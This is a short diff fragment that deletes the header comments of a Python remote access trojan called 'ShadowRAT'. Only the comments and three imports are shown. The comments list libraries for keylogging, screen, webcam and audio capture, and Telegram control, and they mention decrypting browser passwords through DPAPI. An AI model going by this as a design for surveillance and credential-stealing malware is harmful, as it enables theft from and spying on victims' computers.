@@ -1,7 +1,3 @@
-# ShadowRAT - Ultimate Windows Edition 2026
-# Python 3.10+ | Required: pip install pyTelegramBotAPI pynput pillow opencv-python pyautogui psutil cryptography sounddevice soundfile pyperclip netifaces
-# Removed pywin32 dependency; replaced with ctypes for DPAPI decryption (browser passwords)
-
 import telebot
 import os
 import platform
